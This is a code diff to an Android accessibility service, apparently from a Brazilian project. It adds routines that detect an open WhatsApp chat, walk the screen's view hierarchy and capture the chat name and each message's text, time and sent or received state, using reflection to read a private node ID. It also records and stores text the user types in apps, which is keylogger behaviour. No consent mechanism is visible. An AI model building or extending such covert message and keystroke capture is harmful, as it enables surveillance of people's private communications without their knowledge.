@@ -11,14 +11,16 @@ import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
+import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
 import java.util.Objects;
 
 import vox.com.br.dao.AppAbertoDao;
-import vox.com.br.dao.MessageDao;
+import vox.com.br.dao.ChatWhatsDao;
 import vox.com.br.model.AppAberto;
+import vox.com.br.model.ChatWhats;
 import vox.com.br.model.Message;
 
 public class MyAccessibilityService extends AccessibilityService {
@@ -47,19 +49,55 @@ public class MyAccessibilityService extends AccessibilityService {
 
         // Se o evento for do tipo TYPE_VIEW_CLICKED
         if (AccessibilityEvent.TYPE_VIEW_CLICKED == accessibilityEvent.getEventType()) {
-        Log.e(TAG, "OnType_View_Clicked: " + accessibilityEvent.getSource() );
+            Log.e(TAG, "OnType_View_Clicked: ");
+
+//            try {
+//                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
+//                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
+//
+//                if (applicationLabel.toString().equals("WhatsApp") && accessibilityEvent.getText().size() > 2) {
+//                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + accessibilityEvent.getPackageName());
+//
+//                    AccessibilityNodeInfo nodeInfo = accessibilityEvent.getSource();
+//                    // Pegando o ID
+//                    long sourceNodeId = -1;
+//                    try {
+//                        Field sourceNodeIdField = AccessibilityNodeInfo.class.getDeclaredField("mSourceNodeId");
+//                        sourceNodeIdField.setAccessible(true);
+//                        sourceNodeId = sourceNodeIdField.getLong(nodeInfo);
+//                    } catch (NoSuchFieldException | IllegalAccessException e) {
+//                        e.printStackTrace();
+//                    }
+//                    ChatWhatsDao dao = new ChatWhatsDao();
+//                    ChatWhats chatWhats = new ChatWhats(sourceNodeId, accessibilityEvent.getText().get(1).toString());
+//
+//                    dao.salvar(chatWhats);
+//
+//                }
+//
+//            } catch (PackageManager.NameNotFoundException e) {
+//                throw new RuntimeException(e);
+//            }
+
+
         }
 
         // Se o evento for do tipo TYPE_WINDOW_CONTENT_CHANGED -------------------------------------
         if (AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED == accessibilityEvent.getEventType()) {
+            Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: ");
             try {
                 ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
                 CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
 
-                if (applicationLabel.toString().equals("WhatsApp") || applicationLabel.toString().equals("Teams")) {
-                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " );
+                //|| applicationLabel.toString().equals("Teams")
+                if (applicationLabel.toString().equals("WhatsApp")) {
+                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + accessibilityEvent.getPackageName());
 
-                    logViewGroup(getRootInActiveWindow(), 0);
+                    // Verifica se está no chat para tentar resgatar as mensagens
+                    if (verificaSeEstaNoChat(getRootInActiveWindow(), 1)) {
+//                        logNodeHeirarchy(getRootInActiveWindow(), 0);
+                        getChat(getRootInActiveWindow(),0);
+                    }
 
                 }
 
@@ -82,12 +120,15 @@ public class MyAccessibilityService extends AccessibilityService {
             // Resgando oq está sendo digitado pelo usuário em um TextEdit
             List<String> textoDigitado = new ArrayList<>();
             if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                Log.e(TAG, "onAccessibilityEvent: " + accessibilityEvent.getText().get(0).toString());
-                textoDigitado.add(accessibilityEvent.getText().get(0).toString());
+                if (!accessibilityEvent.getText().isEmpty()) {
+                    Log.e(TAG, "onAccessibilityEvent: " + accessibilityEvent.getText().get(0).toString());
+                    textoDigitado.add(accessibilityEvent.getText().get(0).toString());
 
-                Log.e(TAG, "onAccessibilityEvent: " + textoDigitado);
-                AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
-                appAbertoDao.atualizarDigitados(appAbertoAtual);
+                    Log.e(TAG, "onAccessibilityEvent: " + textoDigitado);
+                    AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
+                    appAbertoDao.atualizarDigitados(appAbertoAtual);
+                }
+
             }
         }
 
@@ -169,78 +210,130 @@ public class MyAccessibilityService extends AccessibilityService {
         Log.e(TAG, "onServiceConnected: ");
     }
 
-    // Lista de mensagens
-    public static void logViewGroup(AccessibilityNodeInfo nodeInfo, int depth) {
+    public static Boolean verificaSeEstaNoChat(AccessibilityNodeInfo nodeInfo, int depth) {
+
+        if (nodeInfo.getChild(0) == null) return false;
+        nodeInfo = nodeInfo.getChild(0);
+        if (nodeInfo.getClassName().toString().equals("android.widget.LinearLayout") && nodeInfo.getChildCount() == 2 && depth == 6) return true;
+        depth++;
+
+        return verificaSeEstaNoChat(nodeInfo, depth);
+    }
+
+    public static void logNodeHeirarchy(AccessibilityNodeInfo nodeInfo, int depth) {
 
         if (nodeInfo == null) return;
 
-//        MessageDao messageDao = new MessageDao();
-
         String logString = "";
+        String className = nodeInfo.getClassName().toString();
 
         for (int i = 0; i < depth; ++i) {
             logString += " ";
         }
 
+        logString += "Text: " + nodeInfo.getText() + " " + " Content-Description: " + nodeInfo.getContentDescription() + " ClassName: " + nodeInfo.getClassName().toString() + " Depth: " + depth;
 
 
-        CharSequence texto = nodeInfo.getText();
-        CharSequence descricao = nodeInfo.getContentDescription();
-        String className = nodeInfo.getClassName().toString();
 
-
-        logString += "Text: " + texto + " " +
-                " Content-Description: " + descricao + " " +
-                "Tipo View: " + nodeInfo.getClassName().toString() + " "
-        ;
-
-        // Antes de chegar aqui, no loop for foi enviado o irmão dele, existem 2 layout no depth 14, que são o texto e horario com estado ou sem.
-        //  depth = 14, className = android.widget.TextView
-        if (depth == 14) {
-            Message msg = new Message();
-
-            // depth = 13, className = android.widget.FrameLayout
-            AccessibilityNodeInfo fatherOfNodeInfo = nodeInfo.getParent();
-            // depth = 14, className = android.widget.LinearLayout
-            AccessibilityNodeInfo brotherOfNodeInfo = fatherOfNodeInfo.getChild(1);
-            int qtdDeChild = brotherOfNodeInfo.getChildCount();
-
-
-            // Essa Depth e classname carrega o horario enviado ou recebido
-            // depth = 15, className = android.widget.TextView
-            AccessibilityNodeInfo childDepth15 = brotherOfNodeInfo.getChild(0);
-            CharSequence horario = childDepth15.getText(); // Horario
-            msg.setHorario(horario.toString());
-
-            if (qtdDeChild == 1) {
-                msg.setEstado(Message.Estado.RECEBIDO);
-            } else {
-                // Essa Depth e classname carrega o estado enviado ou recebido
-                // depth = 15, className = android.widget.ImageView
-                AccessibilityNodeInfo secondChildDepth15 = brotherOfNodeInfo.getChild(1);
-                CharSequence estado = secondChildDepth15.getContentDescription();
-                msg.setEstado(Message.Estado.ENVIADO);
-            }
-
-            // Pegar mensagem do texto
-            if (texto != null && className.equals("android.widget.TextView")) {
-                msg.setTexto(texto.toString());
-            }
-
-            Log.e(TAG, "logNodeHeirarchy: " + logString );
-            Log.e(TAG, "logNodeHeirarchy: " + msg );
-
-        } if (depth == 12) {
-            Log.e(TAG, "Dia mandado: " + logString );
+        if (depth == 11 && className.equals("android.view.ViewGroup")) {
+            Log.e(TAG, "logNodeHeirarchy: " + contar(nodeInfo) );
         }
-
-
-        // Aqui precisamos achar o TextView na posição 14, e pegar junto com ele a próxima Child da mesma posição
-        // Essa proxima Child carrega o horário e seu estado (recebido ou enviado)
+        Log.e(TAG, "logNodeHeirarchy: " + logString );
         for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
-            logViewGroup(nodeInfo.getChild(i), depth + 1);
+            logNodeHeirarchy(nodeInfo.getChild(i), depth + 1);
         }
     }
 
+    // Conta o número de filhos de um nó
+    public static int contar(AccessibilityNodeInfo nodeInfo) {
+
+        if (nodeInfo == null) {
+            return 0;
+        }
+        int contador = 1;
+
+        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
+            contador += contar(nodeInfo.getChild(i));
+        }
+        return contador;
+    }
+
+    public static ChatWhats nomeDoChat = new ChatWhats(0, "");
+
+    // Lista de mensagens
+    public static void getChat(AccessibilityNodeInfo nodeInfo, int depth) {
+        if (nodeInfo == null) return;
+
+        String className = nodeInfo.getClassName().toString();
+
+        if (depth == 11 && className.equals("android.widget.FrameLayout") && nodeInfo.getChild(0).getClassName().toString().equals("android.widget.TextView") && nomeDoChat.getMensagens().isEmpty()) {
+            AccessibilityNodeInfo chat = nodeInfo.getChild(0);
+
+            // Pegando o ID
+            long sourceNodeId = -1;
+            try {
+                Field sourceNodeIdField = AccessibilityNodeInfo.class.getDeclaredField("mSourceNodeId");
+                sourceNodeIdField.setAccessible(true);
+                sourceNodeId = sourceNodeIdField.getLong(chat);
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                e.printStackTrace();
+            }
+
+            nomeDoChat.setNome(chat.getText().toString());
+            nomeDoChat.setId(sourceNodeId);
+            Log.e(TAG, "getChat: " + chat );
+        }
+
+        if (depth == 11 && className.equals("android.view.ViewGroup")) {
+
+            AccessibilityNodeInfo depth10ListView = nodeInfo.getParent();
+
+
+            // Pegando o ID
+            long sourceNodeId = -1;
+            try {
+                Field sourceNodeIdField = AccessibilityNodeInfo.class.getDeclaredField("mSourceNodeId");
+                sourceNodeIdField.setAccessible(true);
+                sourceNodeId = sourceNodeIdField.getLong(nodeInfo);
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                e.printStackTrace();
+            }
+
+            Message message = new Message();
+            message.setId(sourceNodeId);
+            getAnything(nodeInfo, message);
+
+            // todo adicionar a mensagem no chat (fazer uma função atualizar())
+            nomeDoChat.getMensagens().add(message);
+
+
+            Log.e(TAG, "getChat: " + message );
+        }
+
+        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
+            getChat(nodeInfo.getChild(i), depth + 1);
+        }
+    }
+
+    public static void getAnything(AccessibilityNodeInfo nodeInfo, Message message) {
+
+        if (nodeInfo == null) return;
+
+        CharSequence text = nodeInfo.getText();
+        CharSequence description = nodeInfo.getContentDescription();
+
+        if (text != null) {
+            message.addMessage(text.toString());
+        }
+
+        if (description != null) {
+            message.addMessage(description.toString());
+        }
+
+        // Percorre os filhos
+        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
+            getAnything(nodeInfo.getChild(i), message);
+        }
+    }
 
 }
